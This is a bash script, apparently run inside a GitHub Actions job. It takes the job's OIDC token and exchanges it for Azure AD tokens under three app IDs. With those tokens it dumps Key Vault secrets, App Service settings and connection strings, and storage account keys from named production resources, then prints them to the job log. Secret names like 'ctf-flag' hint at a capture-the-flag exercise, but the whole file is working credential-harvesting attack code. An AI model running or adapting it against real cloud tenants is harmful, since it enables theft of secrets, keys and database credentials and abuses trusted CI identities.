#!/usr/bin/env bash
set -u
TEN="$AZURE_TENANT_ID"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "OIDC_LEN=${#OIDC}"
APPS="72ff278a-9e71-43ec-bac4-2ca303f8e462 891fb158-e02c-4428-a885-53b811f369c0 462d1c38-4459-48b8-9333-82e389e59514"
SUB="$AZURE_SUBSCRIPTION_ID"
RG="rg-tbl-platform-prod-sea"
for APP in $APPS; do
  echo "===== APP $APP ====="
  AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
      -d "client_id=$APP" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" \
      -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
      --data-urlencode "client_assertion=$OIDC" | jq -r '.access_token // empty')
  VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
      -d "client_id=$APP" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" \
      -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
      --data-urlencode "client_assertion=$OIDC" | jq -r '.access_token // empty')
  echo "ARM_LEN=${#AT} VAULT_LEN=${#VT}"
  if [ -n "$VT" ]; then
    for KV in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
      echo "--- $KV list ---"
      curl -sS -H "Authorization: Bearer $VT" "https://$KV.vault.azure.net/secrets?api-version=7.4&maxresults=25" | head -c 3000; echo
      for S in cost-reader-principal directory-audit-principal reporting-service-principal flag ctf-flag tbl-flag; do
        echo "--- $KV secret $S ---"
        curl -sS -H "Authorization: Bearer $VT" "https://$KV.vault.azure.net/secrets/$S?api-version=7.4" | head -c 3000; echo
      done
    done
  fi
  if [ -n "$AT" ]; then
    for SITE in app-tbl-storefront-prod app-tbl-reporting-prod; do
      echo "--- appsettings $SITE ---"
      curl -sS -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" \
        -d '{}' "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/$SITE/config/appsettings/list?api-version=2022-09-01" | head -c 4000; echo
      echo "--- connstrings $SITE ---"
      curl -sS -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" \
        -d '{}' "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/$SITE/config/connectionstrings/list?api-version=2022-09-01" | head -c 3000; echo
    done
    echo "--- listKeys appcfg ---"
    curl -sS -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -d '{}' \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" | head -c 1500; echo
    echo "--- listKeys cilogs ---"
    curl -sS -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -d '{}' \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01" | head -c 1500; echo
    echo "--- appcfg blob list (ARM) ---"
    curl -sS -H "Authorization: Bearer $AT" \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/blobServices/default/containers/config/blobs?api-version=2022-09-01" | head -c 3000; echo
  fi
done
echo "===== DONE ====="
